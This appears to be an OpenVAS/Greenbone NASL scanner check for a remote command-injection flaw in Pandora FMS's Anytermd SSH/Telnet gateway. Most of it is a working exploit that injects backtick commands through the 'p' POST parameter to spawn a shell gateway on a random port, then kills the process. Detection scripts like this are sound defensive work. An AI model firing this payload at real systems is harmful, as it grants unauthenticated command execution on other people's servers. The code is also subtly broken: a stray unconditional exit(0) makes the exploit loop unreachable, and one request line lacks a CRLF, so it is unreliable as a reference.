CPE = "cpe:/a:artica:pandora_fms";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103897" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_version( "2019-05-14T08:13:05+0000" );
	script_name( "Pandora FMS Remote Command Execution Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124983/Pandora-FMS-5.0RC1-Code-Execution.html" );
	script_tag( name: "last_modification", value: "2019-05-14 08:13:05 +0000 (Tue, 14 May 2019)" );
	script_tag( name: "creation_date", value: "2014-01-30 13:13:42 +0100 (Thu, 30 Jan 2014)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "gb_pandora_fms_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "pandora_fms/installed" );
	script_tag( name: "impact", value: "Successful exploits will allow remote attackers to execute arbitrary
  commands within the context of the i'pandora' user." );
	script_tag( name: "vuldetect", value: "Try to execute a command on the remote Host by sending some special crafted HTTP requests." );
	script_tag( name: "insight", value: "The Pandora 4.0.3 / 4.1 / 5.0 RC1 appliances are prone to security
  vulnerabilities. The Anytermd daemon used for the SSH/Telnet gateway on TCP port
  8022/8023 is vulnerable to command injection in the \"p\" POST parameter, which allows
  any unauthenticated attacker to execute arbitrary commands with the rights of the
  \"pandora\" user." );
	script_tag( name: "solution", value: "Update to Pandora FMS 5.0 final." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Pandora FMS versions 5.0RC1 and below suffer from a code execution vulnerability." );
	script_tag( name: "affected", value: "Pandora FMS versions 5.0RC1 and below." );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
if(!get_app_port( cpe: CPE )){
	;
}
exit( 0 );
ports = make_list( "8022",
	 "8023" );
host = get_host_name();
for port in ports {
	if(!get_port_state( port )){
		continue;
	}
	rport = ( ( rand() % 65535 ) / 1024 ) + 2048;
	soc = open_sock_tcp( rport );
	if(soc){
		close( soc );
		continue;
	}
	ex = "a=open&p=%60/usr/bin/anytermd --port " + rport + " --user pandora -c %25p%60";
	len = strlen( ex );
	req = "POST /anyterm-module HTTP/1.1\r\n" + "Host: " + host + ":" + port + "\r\n" + "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + ex;
	result = http_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!IsMatchRegexp( result, "HTTP/1\\.. 200" )){
		continue;
	}
	soc = open_sock_tcp( rport );
	if(!soc){
		continue;
	}
	close( soc );
	req = "GET /anyterm-module HTTP/1.1" + "Host: " + host + ":" + rport + "\r\n\r\n";
	result = http_send_recv( port: rport, data: req, bodyonly: FALSE );
	if(IsMatchRegexp( result, "HTTP/1\\.." )){
		ex = "a=open&p=%60kill -9 $PPID%60";
		len = strlen( ex );
		req = "POST /anyterm-module HTTP/1.1\r\n" + "Host: " + host + ":" + rport + "\r\n" + "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n" + "Content-Length: " + len + "\r\n" + "\r\n" + ex;
		http_send_recv( port: rport, data: req, bodyonly: FALSE );
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

